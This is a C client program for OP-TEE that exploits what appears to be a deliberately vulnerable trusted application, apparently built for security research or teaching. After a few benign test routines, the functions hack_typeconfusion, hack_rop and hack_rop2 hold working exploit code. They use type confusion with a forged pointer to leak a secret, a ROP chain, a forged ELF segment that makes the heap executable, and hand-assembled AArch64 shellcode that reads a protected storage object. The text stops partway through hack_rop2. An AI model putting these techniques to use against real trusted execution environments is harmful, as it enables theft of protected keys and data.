#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sysexits.h>
#include <errno.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>

/* To the the UUID (found the the TA's h-file(s)) */
#include <vuln_ta.h>

#include "tee_api_defines.h"

#include <stdio.h>
#include <execinfo.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>



static inline uint64_t reg_pair_to_64(uint32_t reg0, uint32_t reg1)
{
    return (uint64_t)reg0 << 32 | reg1;
}

static inline void reg_pair_from_64(uint64_t val, uint32_t *reg0,
            uint32_t *reg1)
{
    *reg0 = val >> 32;
    *reg1 = val;
}

void handler(int sig) {
  void *array[64];
  size_t size;

  // get void*'s for all entries on the stack
  size = backtrace(array, 10);

  // print out all the frames to stderr
  fprintf(stderr, "==== ERROR ====\nsignal %d:\n", sig);
  backtrace_symbols_fd(array, size, STDERR_FILENO);
  fprintf(stderr, "\n");
  fprintf(stdout, "\n");
  exit(1);
}

static void report_return(char const *fct, uint32_t returnCode, uint32_t origin)
{
    char* originText = "";
    char* returnCodeText = "";
    switch(origin)
    {
        // 1--4
        case TEEC_ORIGIN_API: originText = "TEEC_ORIGIN_API"; break;
        case TEEC_ORIGIN_COMMS: originText = "TEEC_ORIGIN_COMMS"; break;
        case TEEC_ORIGIN_TEE: originText = "TEEC_ORIGIN_TEE"; break;
        case TEEC_ORIGIN_TRUSTED_APP: originText = "TEEC_ORIGIN_TRUSTED_APP"; break;
        // >4
        default: originText = "reserved for future use"; break;
    }
    switch(returnCode)
    {
        // TEE_SUCCESS, TEEC_SUCCESS @ 0x00000000
        case 0x00000000: returnCodeText = "SUCCESS"; break;
        // Client API defined Errors TEEC_* @ 0xFFFF00..
        case TEEC_ERROR_GENERIC: returnCodeText = "TEEC_ERROR_GENERIC"; break;
        case TEEC_ERROR_ACCESS_DENIED: returnCodeText = "TEEC_ERROR_ACCESS_DENIED"; break;
        case TEEC_ERROR_CANCEL: returnCodeText = "TEEC_ERROR_CANCEL"; break;
        case TEEC_ERROR_ACCESS_CONFLICT: returnCodeText = "TEEC_ERROR_ACCESS_CONFLICT"; break;
        case TEEC_ERROR_EXCESS_DATA: returnCodeText = "TEEC_ERROR_EXCESS_DATA"; break;
        case TEEC_ERROR_BAD_FORMAT: returnCodeText = "TEEC_ERROR_BAD_FORMAT"; break;
        case TEEC_ERROR_BAD_PARAMETERS: returnCodeText = "TEEC_ERROR_BAD_PARAMETERS"; break;
        case TEEC_ERROR_BAD_STATE: returnCodeText = "TEEC_ERROR_BAD_STATE"; break;
        case TEEC_ERROR_ITEM_NOT_FOUND: returnCodeText = "TEEC_ERROR_ITEM_NOT_FOUND"; break;
        case TEEC_ERROR_NOT_IMPLEMENTED: returnCodeText = "TEEC_ERROR_NOT_IMPLEMENTED"; break;
        case TEEC_ERROR_NOT_SUPPORTED: returnCodeText = "TEEC_ERROR_NOT_SUPPORTED"; break;
        case TEEC_ERROR_NO_DATA: returnCodeText = "TEEC_ERROR_NO_DATA"; break;
        case TEEC_ERROR_OUT_OF_MEMORY: returnCodeText = "TEEC_ERROR_OUT_OF_MEMORY"; break;
        case TEEC_ERROR_BUSY: returnCodeText = "TEEC_ERROR_BUSY"; break;
        case TEEC_ERROR_COMMUNICATION: returnCodeText = "TEEC_ERROR_COMMUNICATION"; break;
        case TEEC_ERROR_SECURITY: returnCodeText = "TEEC_ERROR_SECURITY"; break;
        case TEEC_ERROR_SHORT_BUFFER: returnCodeText = "TEEC_ERROR_SHORT_BUFFER"; break;
        // *NON* Client API defined Errors TEEC_* @ 0xFFFF00..
        case TEE_ERROR_EXTERNAL_CANCEL: returnCodeText = "TEE_ERROR_EXTERNAL_CANCEL"; break;
        // *NON* Client API defined Errors TEEC_* @ 0xFFFF30..
        case TEE_ERROR_OVERFLOW: returnCodeText = "TEE_ERROR_OVERFLOW"; break;
        case TEE_ERROR_TARGET_DEAD: returnCodeText = "TEE_ERROR_TARGET_DEAD"; break;
        case TEE_ERROR_STORAGE_NO_SPACE: returnCodeText = "TEE_ERROR_STORAGE_NO_SPACE"; break;
        case TEE_ERROR_MAC_INVALID: returnCodeText = "TEE_ERROR_MAC_INVALID"; break;
        case TEE_ERROR_SIGNATURE_INVALID: returnCodeText = "TEE_ERROR_SIGNATURE_INVALID"; break;
        // *NON* Client API defined Errors TEEC_* @ 0xFFFF50..
        case TEE_ERROR_TIME_NOT_SET: returnCodeText = "TEE_ERROR_TIME_NOT_SET"; break;
        case TEE_ERROR_TIME_NEEDS_RESET: returnCodeText = "TEE_ERROR_TIME_NEEDS_RESET"; break;
        
        // TEE @ 
        default:
            returnCodeText =
                origin == TEEC_ORIGIN_TRUSTED_APP 
                ? "TA-defined"
                : returnCode < 0x70000000 
                ? "reserved for GlobalPlatform non-error"
                : returnCode < 0x80000000
                ? "reserved for implementation-defined non-error"
                : returnCode < 0xF0000000 
                ? "reserved for GlobalPlatform future use"
                : returnCode < 0xFFFF0000 
                ? "reserved for GlobalPlatform TEE API"
                : "reserved for GlobalPlatform TEE Client API";
            break;
    }
    printf("%s failed with origin and return code:\n", fct);
    printf("%8x (%s): %8x (%s)\n", origin, originText, returnCode, returnCodeText);
}

static void check_return(char const *fct, uint32_t res, uint32_t err_origin)
{
    if (res != TEEC_SUCCESS) {
        report_return(fct, res, err_origin);
        errx(1, "Fatal error.\n");
    }
}










static void invoke()
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = TA_VULN_UUID;
    uint32_t err_origin;

    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

                

            
            
    memset(&op, 0, sizeof(op));
    char sessname[] = "MY BENEVOLENT TEST SESSION";
    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_MEMREF_TEMP_INPUT,
            TEEC_NONE,
            TEEC_NONE,
            TEEC_NONE
        );
    op.params[0].tmpref.buffer = sessname;
    op.params[0].tmpref.size = sizeof(sessname);
    printf("Invoking TA for strdup session name, size %zu\n", sizeof(sessname));
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_NAME, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    if(res != TEE_SUCCESS) goto fin;
            
            
            
            
    memset(&op, 0, sizeof(op));

    char buffer_a[512];
    char buffer_b[512];
    strcpy(buffer_a, "a");
    strcpy(buffer_b, "42");

    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_MEMREF_TEMP_INOUT,
            TEEC_VALUE_INOUT,
            TEEC_MEMREF_TEMP_INPUT,
            TEEC_VALUE_INPUT
        );
    op.params[0].tmpref.buffer = buffer_a;
    op.params[0].tmpref.size = sizeof(buffer_a);
    reg_pair_from_64(strlen(buffer_a),&op.params[1].value.a,&op.params[1].value.b);
    op.params[2].tmpref.buffer = buffer_b;
    op.params[2].tmpref.size = strlen(buffer_b);
    reg_pair_from_64(6,&op.params[1].value.a,&op.params[3].value.b);
    
    
    printf("Invoking TA for %s, %s\n", (char*)op.params[0].tmpref.buffer,(char*)op.params[2].tmpref.buffer);
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_FIBUFNACCI, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    if(res != TEE_SUCCESS) goto fin;
    
    printf("Length: %zu\n", reg_pair_to_64(op.params[1].value.a,op.params[1].value.b));
    printf("Strlen: %zu\n", strlen(op.params[0].tmpref.buffer));
    printf("Size: %zu\n", op.params[0].tmpref.size);
    printf("Pointer: %p\n", op.params[0].tmpref.buffer);
    printf("Contents: %s\n", (char*)op.params[0].tmpref.buffer);
    fin:
    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);
}







static void remember()
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = TA_VULN_UUID;
    uint32_t err_origin;

    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

                

            
            
    memset(&op, 0, sizeof(op));
    char contents[] = "SOMETHING TO REMEMBER";
    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_MEMREF_TEMP_INPUT,
            TEEC_NONE,
            TEEC_NONE,
            TEEC_NONE
        );
    op.params[0].tmpref.buffer = contents;
    op.params[0].tmpref.size = sizeof(contents); // includes NULbyte
    printf("Invoking TA for remember, size %zu\n", sizeof(contents));
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_REMEMBER, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    if(res != TEE_SUCCESS) goto fin;            
      
    fin:
    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);
}


static void check()
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = TA_VULN_UUID;
    uint32_t err_origin;

    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

                

            
            
    memset(&op, 0, sizeof(op));
    char correct[] = "SOMETHING TO REMEMBER";
    char wrong[] =   "SOMETHING TO FORGET!!";
    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_MEMREF_TEMP_INPUT,
            TEEC_NONE,
            TEEC_NONE,
            TEEC_NONE
        );
        
    op.params[0].tmpref.buffer = correct;
    op.params[0].tmpref.size = sizeof(correct); // includes NULbyte
    printf("Invoking TA for TA_VULN_CMD_CHECK1, size %zu\n", sizeof(correct));
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_CHECK1, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    
    
    op.params[0].tmpref.buffer = correct;
    op.params[0].tmpref.size = sizeof(correct); // includes NULbyte
    printf("Invoking TA for TA_VULN_CMD_CHECK2, size %zu\n", sizeof(correct));
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_CHECK2, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    
    
    op.params[0].tmpref.buffer = wrong;
    op.params[0].tmpref.size = sizeof(wrong); // includes NULbyte
    printf("Invoking TA for TA_VULN_CMD_CHECK1, size %zu\n", sizeof(wrong));
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_CHECK1, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    
    
    op.params[0].tmpref.buffer = wrong;
    op.params[0].tmpref.size = sizeof(wrong); // includes NULbyte
    printf("Invoking TA for TA_VULN_CMD_CHECK2, size %zu\n", sizeof(wrong));
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_CHECK2, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
      
    fin:
    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);
}





static void hack_typeconfusion()
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = TA_VULN_UUID;
    
    uint32_t err_origin;
    
    // printf("%s %d\n", __FILE__, __LINE__);

    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx);
    // printf("%s %d\n", __FILE__, __LINE__);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    
    // printf("%s %d\n", __FILE__, __LINE__);
    
    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    printf("%s %d\n", __FILE__, __LINE__);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

    memset(&op, 0, sizeof(op));

    // printf("%s %d\n", __FILE__, __LINE__);
    
    {
        // secret is at 0x40010000 + 0x0002fb0f
        char buffer_a[512];
        char buffer_b[32+15+1];
        strcpy(buffer_a, "a");
        memset(buffer_b, 0, sizeof(buffer_b));
        memset(buffer_b, 'b', sizeof(buffer_b)-1);


        op.paramTypes = TEEC_PARAM_TYPES
            (
                TEEC_MEMREF_TEMP_INOUT,
                TEEC_VALUE_INOUT,
                TEEC_MEMREF_TEMP_INPUT,
                TEEC_VALUE_INPUT
            );
        
        // printf("%s %d\n", __FILE__, __LINE__);
        
        op.params[0].tmpref.buffer = buffer_a;
        op.params[0].tmpref.size = sizeof(buffer_a);
        reg_pair_from_64(strlen(buffer_a),&op.params[1].value.a,&op.params[1].value.b);
        op.params[2].tmpref.buffer = buffer_b;
        op.params[2].tmpref.size = strlen(buffer_b);
        reg_pair_from_64(1,&op.params[1].value.a,&op.params[3].value.b);
        
        printf("Invoking TA for %s, %s\n", "output buffer","dummy buffer");
        res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_FIBUFNACCI, &op, &err_origin);
        report_return("TEEC_InvokeCommand", res, err_origin);
        if(res != TEE_SUCCESS) goto fin;
        
        printf("Length: %zu\n", reg_pair_to_64(op.params[1].value.a,op.params[1].value.b));
        printf("Strlen: %zu\n", strlen(op.params[0].tmpref.buffer));
        printf("Size: %zu\n", op.params[0].tmpref.size);
        printf("Pointer: %p\n", op.params[0].tmpref.buffer);
        printf("Contents: %s\n", (char*)op.params[0].tmpref.buffer);
    }
    
    {
        // secret is at 0x40010000 + 0x0002fb0f
        char buffer_a[512];
        char buffer_b[] = "";
        strcpy(buffer_a, "");

        op.paramTypes = TEEC_PARAM_TYPES
            (
                TEEC_MEMREF_TEMP_INOUT,
                TEEC_VALUE_INOUT,
                TEEC_VALUE_INPUT,
                TEEC_VALUE_INPUT
            );
        
        // printf("%s %d\n", __FILE__, __LINE__);
        
        op.params[0].tmpref.buffer = buffer_a;
        op.params[0].tmpref.size = sizeof(buffer_a);
        reg_pair_from_64(strlen(buffer_a),&op.params[1].value.a,&op.params[1].value.b);
        op.params[2].tmpref.buffer = 0x40010000 + 0x0002fb0f;
        op.params[2].tmpref.size = 32+15;
        reg_pair_from_64(1,&op.params[1].value.a,&op.params[3].value.b);
        
        printf("Invoking TA for %s, %s\n", "output buffer","fake pointer");
        res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_FIBUFNACCI, &op, &err_origin);
        report_return("TEEC_InvokeCommand", res, err_origin);
        if(res != TEE_SUCCESS) goto fin;
        
        printf("Length: %zu\n", reg_pair_to_64(op.params[1].value.a,op.params[1].value.b));
        printf("Strlen: %zu\n", strlen(op.params[0].tmpref.buffer));
        printf("Size: %zu\n", op.params[0].tmpref.size);
        printf("Pointer: %p\n", op.params[0].tmpref.buffer);
        printf("Contents: %s\n", (char*)op.params[0].tmpref.buffer);
    }
    fin:
    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);
}








static void hack_rop()
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = TA_VULN_UUID;
    
    uint32_t err_origin;
    
    // printf("%s %d\n", __FILE__, __LINE__);

    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx);
    // printf("%s %d\n", __FILE__, __LINE__);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    
    // printf("%s %d\n", __FILE__, __LINE__);
    
    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    printf("%s %d\n", __FILE__, __LINE__);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

    memset(&op, 0, sizeof(op));

    // printf("%s %d\n", __FILE__, __LINE__);
    
    // buffer a contains the rop codes
    // fib0((x0, ..., x(N-1)),()) = (x0, ..., x(N-1)) 
    // fib1((x0, ..., x(N-1)),()) = fib0((x0, ..., x(N-1)+1), (x0, ..., x(N-1))) = (x0, ..., x(N-1)+1)
    
    // ==== STACK ====
    // # fib2(a2,a3)
    //      a1 Buffer, written with a2+a3
    // ^    x29, x30
    // ^    ...
    // # fib1(a1,a2)
    // ^--- a0 Buffer, written with a1+a2 = a2+a2+a3
    //      x29, x30
    //      ...
    // # fib0(a0,a1)
    //      Buffer, unwritten.
    //      x29, x30
    //      variables?
    // # strdup(a0)
    //      ...
    
    // buffer a is empty to leave b unchanged.
    char buffer_a[] = "";
    // char*, we want to have pointers here.
    size_t load_base = 0x40010000; /* no +LMA of 0x20... */  
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wint-conversion"
    char*  buffer_b[] = {
#include "rop1.h"
    };
#pragma GCC diagnostic pop
    for(size_t i = sizeof(buffer_b)/sizeof(*buffer_b); i != 0 ; i--)
    {
        printf("%zu: %p\n", i, buffer_b[i]);
    }
    strcpy(buffer_a, "");

    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_MEMREF_TEMP_INOUT,
            TEEC_VALUE_INOUT,
            TEEC_MEMREF_TEMP_INPUT,
            TEEC_VALUE_INPUT
        );
    
    // printf("%s %d\n", __FILE__, __LINE__);
    
    op.params[0].tmpref.buffer = ((char*)buffer_a);
    op.params[0].tmpref.size = sizeof(buffer_a);
    // 0, not sizeof! sizeof("")==1 due to minimum lengths
    reg_pair_from_64(0,&op.params[1].value.a,&op.params[1].value.b);
    op.params[2].tmpref.buffer = ((char*)buffer_b); // somehow there is an off by one error?
    op.params[2].tmpref.size = sizeof(buffer_b);
    reg_pair_from_64(2,&op.params[1].value.a,&op.params[3].value.b);
    
    printf("Invoking TA for %s, %s\n", "empty buffer","rop buffer");
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_FIBUFNACCI, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    if(res != TEE_SUCCESS) goto fin;
    
    fin:

    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);
}

















// Für den Aufruf von sys_set_prot mit nur einem Parameter:

void ta_elf_finalize_mappings(struct ta_elf *elf);
// x0 := pointer to stack or heap
// jump to position after saving LR to stack -- this will happen due to calls to syscall helper and printf functions
// https://github.com/OP-TEE/optee_os/blob/3.6.0/ldelf/ta_elf.c


typedef struct {
	uint32_t timeLow;
	uint16_t timeMid;
	uint16_t timeHiAndVersion;
	uint8_t clockSeqAndNode[8];
} TEE_UUID;
typedef uintptr_t vaddr_t;
// https://github.com/OP-TEE/optee_os/blob/3.6.0/ldelf/include/elf_common.h
/* Values for p_flags. */
#define	PF_X		0x1		/* Executable. */
#define	PF_W		0x2		/* Writable. */
#define	PF_R		0x4		/* Readable. */
// https://github.com/OP-TEE/optee_os/blob/3.6.0/ldelf/ta_elf.h
#include <sys/queue.h>
struct segment {
	size_t offset;
	size_t vaddr;
	size_t filesz;
	size_t memsz;
	size_t flags;
	size_t align;
	bool remapped_writeable;
	TAILQ_ENTRY(segment) link;
};
TAILQ_HEAD(segment_head, segment);  
struct ta_elf {
	bool is_main;
	bool is_32bit;	
	bool is_legacy;
	vaddr_t load_addr;
	vaddr_t max_addr;
	vaddr_t max_offs;
	vaddr_t ehdr_addr;
	vaddr_t e_entry;
	vaddr_t e_phoff;
	vaddr_t e_shoff;
	unsigned int e_phnum;
	unsigned int e_shnum;
	unsigned int e_phentsize;
	unsigned int e_shentsize;
	void *phdr;
	void *shdr;
	void *dynsymtab;
	size_t num_dynsyms;
	const char *dynstr;
	size_t dynstr_size;
	void *hashtab;
	struct segment_head segs;
	vaddr_t exidx_start;
	size_t exidx_size;
	uint32_t handle;
	struct ta_head *head;
	TEE_UUID uuid;
	TAILQ_ENTRY(ta_elf) link;
};



// warning: these structs will be quite large, and probably do not fit on the stack well.
// 28 lines (sometimes bytes, sometimes small structs) times 8 bytes gives approx 224 bytes for one stuct ta_elf instance
// if we need to put this inbetween the stack, there are some rop gadgets available unrolling enough of stack space.
/*
0x1392c               A8D87BFD                  ldp     x29, x30, [sp], #384
0x4e4c                D65F03C0                  ret
*/
// however, a predictable heap would be much nicer.



static void hack_rop2()
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_UUID uuid = TA_VULN_UUID;
    
    uint32_t err_origin;
    
    // printf("%s %d\n", __FILE__, __LINE__);

    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx);
    // printf("%s %d\n", __FILE__, __LINE__);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    
    // printf("%s %d\n", __FILE__, __LINE__);
    
    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    printf("%s %d\n", __FILE__, __LINE__);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

    memset(&op, 0, sizeof(op));

    // printf("%s %d\n", __FILE__, __LINE__);
    
    // buffer a contains the rop codes
    // fib0((x0, ..., x(N-1)),()) = (x0, ..., x(N-1)) 
    // fib1((x0, ..., x(N-1)),()) = fib0((x0, ..., x(N-1)+1), (x0, ..., x(N-1))) = (x0, ..., x(N-1)+1)
    
    // ==== STACK ====
    // # fib2(a2,a3)
    //      a1 Buffer, written with a2+a3
    // ^    x29, x30
    // ^    ...
    // # fib1(a1,a2)
    // ^--- a0 Buffer, written with a1+a2 = a2+a2+a3
    //      x29, x30
    //      ...
    // # fib0(a0,a1)
    //      Buffer, unwritten.
    //      x29, x30
    //      variables?
    // # strdup(a0)
    //      ...
    
    // buffer a is empty to leave b unchanged.
    char buffer_a[] = "";
    // char*, we want to have pointers here.
    size_t load_base = 0x40010000; /* no +LMA of 0x20... */  
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wint-conversion"
    char* heap_dest_addr = 0x40055620; 
    
    
    // we will make the complete heap r-x instead of rw-
    // doing that with the stack would certainly crash the TA upon calling trace_printf (and maybe on utee_return too) after sys_set_prot has returned.
    #define DONTCARE 0xdcdcdcdcdcdcdcdc
    struct segment fakeseg = {
        .vaddr = 0x40046000, // heap segment address -- also includes other mutable data
        .link =  {
            .tqe_next = NULL, // struct segment*
            .tqe_prev = DONTCARE, // struct segment**
        },
        .memsz = 0x010000, // heap segment size
        .flags = PF_X
    };
    struct ta_elf fakeelf = {
        .is_legacy = true,
        .load_addr = 0, // makes it easier to add offset later on.
        .segs = {
            .tqh_first = heap_dest_addr + sizeof(struct ta_elf), // future fakeseg address
            .tqh_last = DONTCARE, // struct segment**
        }
    };
    
    /*  
       root@kali:~# ipython3
        Python 3.6.8 (default, Jan  3 2019, 03:42:36)
        Type 'copyright', 'credits' or 'license' for more information
        IPython 7.8.0 -- An enhanced Interactive Python. Type '?' for help.
        
from pwn import * 
context.arch = "aarch64"
import binascii

print(b"\\x".join([b""]+[bytes(x) for x in zip(*[iter(binascii.hexlify(asm(

    # utee_log(SECRET, strlen(SECRET))
    # param 1 = SECRET (0x0002fb0f + 0x40010000)
    "movz x0, 0x4003, lsl 16; movk x0, 0xfb0f;"
    # param 2 = length of SECRET
    "mov x1, 49;"
    # bl utee_log (0000000000009c80  + 0x40010000)
    "movz x9, 0x4001, lsl 16; movk x9, 0x9c80 ; blr x9;"
    
    # utee_log("\n", 1)
    # param2 = some string just for the newline (at 0x2f000 + 0xdd0 +0x203 +  0x40010000 = 4003FFD3)
    #     /root/optee2/out-br/build/optee_examples-1.0/vuln/ta/vuln_ta.c:135
    #        SIGN();
    #     6e0:       f0000173        adrp    x19, 2f000 <mbedtls_test_srv_crt_ec+0xe8>
    #     758:       911d8273        add     x19, x19, #0x760
    #     /root/optee2/out-br/build/optee_examples-1.0/vuln/ta/vuln_ta.c:141
    #        DMSG("Hello, I'm VULN!\n");
    #     77c:       91080e64        add     x4, x19, #0x203
    #     790:       94000bb5        bl      3664 <trace_printf>
    # 2f000 will be relocated, thus add 0x40010000, too:
    # 0x40010000 + 0x2f000 + 0x760 + 0x203 = 4003F963
    "movz x0, 0x4003, lsl 16; movk x0, 0xF963;" 
    # add 16 bytes, we only want the newline at the end.
    "add x0, x0, #16;"
    # param 2 = length 1 of newline 
    "mov x1, 2;"
    #  bl utee_log (0000000000009c80 + 0x40010000)
    "movz x9, 0x4001, lsl 16; movk x9, 0x9c80; blr x9;"
    
    # TEE_OpenPersistentObject = 0000000000005100 + 0x40010000
    # (
    # TEE_STORAGE_PRIVATE = 0x00000001,
    # id: shellcode+sizeof(fakeelf) + sizeof(fakeseg) + sizeof(shellcode), id_len: 45,
    # flags: TEE_DATA_FLAG_ACCESS_READ | TEE_DATA_FLAG_SHARE_READ = 0x00000011,
    # handle output: somewhere on the stack, 0x40057000 sounds good -- which is the lowest address present on the stack (heap is R-X now, we can't write here anymore!)
    # )
    "mov x0, 1;"
    # heap_dest_addr + staticdata_offset = 0x40055620 + 0x1d5 = 400557f5 
    "movz x1, 0x4005, lsl 16; movk x1, 0x57f5;"
    "mov x2, 45;" 
    "mov x3, 0x11;"
    "movz x4, 0x4005, lsl 16; movk x4, 0x7000;"
    "movz x9, 0x4001, lsl 16; movk x9, 0x5100; blr x9;"
    
    # TEE_ReadObjectData( handle, buffer , bufsize, outsize) = 00000000000054ec + 0x40010000
    "movz x0, 0x4005, lsl 16; movk x0, 0x7000;"
    "ldr x0, [x0];"
    "movz x1, 0x4005, lsl 16; movk x1, 0x7100;"
    "mov x2, 0x0400;"
    "movz x3, 0x4005, lsl 16; movk x3, 0x7500;"
    "movz x9, 0x4001, lsl 16; movk x9, 0x54ec; blr x9;"
     
    # utee_log(buffer, *outsize)
    "movz x3, 0x4005, lsl 16; movk x3, 0x7500;"
    "ldr x1, [x3];"
    "movz x0, 0x4005, lsl 16; movk x0, 0x7100;"
    "movz x9, 0x4001, lsl 16; movk x9, 0x9c80; blr x9;"
    
    "movz x9, 0x4001, lsl 16; movk x9, 0x9c74; blr x9;" #  bl utee_return (0000000000009c74 + 0x40010000)
    #"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
    #"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
)))]*2)]).decode("ascii")+"\n");

    */
    char shellcode[] = "\x60\x00\xa8\xd2\xe0\x61\x9f\xf2\x21\x06\x80\xd2\x29\x00\xa8\xd2\x09\x90\x93\xf2\x20\x01\x3f\xd6\x60\x00\xa8\xd2\x60\x2c\x9f\xf2\x00\x40\x00\x91\x41\x00\x80\xd2\x29\x00\xa8\xd2\x09\x90\x93\xf2\x20\x01\x3f\xd6\x20\x00\x80\xd2\xa1\x00\xa8\xd2\xa1\xfe\x8a\xf2\xa2\x05\x80\xd2\x23\x02\x80\xd2\xa4\x00\xa8\xd2\x04\x00\x8e\xf2\x29\x00\xa8\xd2\x09\x20\x8a\xf2\x20\x01\x3f\xd6\xa0\x00\xa8\xd2\x00\x00\x8e\xf2\x00\x00\x40\xf9\xa1\x00\xa8\xd2\x01\x20\x8e\xf2\x02\x80\x80\xd2\xa3\x00\xa8\xd2\x03\xa0\x8e\xf2\x29\x00\xa8\xd2\x89\x9d\x8a\xf2\x20\x01\x3f\xd6\xa3\x00\xa8\xd2\x03\xa0\x8e\xf2\x61\x00\x40\xf9\xa0\x00\xa8\xd2\x00\x20\x8e\xf2\x29\x00\xa8\xd2\x09\x90\x93\xf2\x20\x01\x3f\xd6\x29\x00\xa8\xd2\x89\x8e\x93\xf2\x20\x01\x3f\xd6";
    char staticdata[] = "storage:b39193c4-bff6-4325-9598-0753f0ec1fd2\0";
    
    char*  buffer_b[] = {
#include "rop2.h"
    };
    
    
    size_t sessname_sz = sizeof(fakeelf) + sizeof(fakeseg) + sizeof(shellcode) + sizeof(staticdata);
    char* sessname = malloc(sessname_sz);
    memcpy(sessname, &fakeelf, sizeof(fakeelf));
    memcpy(sessname+sizeof(fakeelf), &fakeseg, sizeof(fakeseg));
    memcpy(sessname+sizeof(fakeelf)+sizeof(fakeseg), shellcode, sizeof(shellcode));
    memcpy(sessname+sizeof(fakeelf)+sizeof(fakeseg)+sizeof(shellcode), staticdata, sizeof(staticdata));
    printf("staticdata offset is 0x%zx\n", (size_t)(sizeof(fakeelf)+sizeof(fakeseg)+sizeof(shellcode)));
    

#pragma GCC diagnostic pop

    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_MEMREF_TEMP_INPUT,
            TEEC_NONE,
            TEEC_NONE,
            TEEC_NONE
        );
    op.params[0].tmpref.buffer = sessname;
    op.params[0].tmpref.size = sessname_sz;
    printf("Invoking TA for strdup session name, size %zu\n", sessname_sz);
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_NAME, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    if(res != TEE_SUCCESS) goto fin;




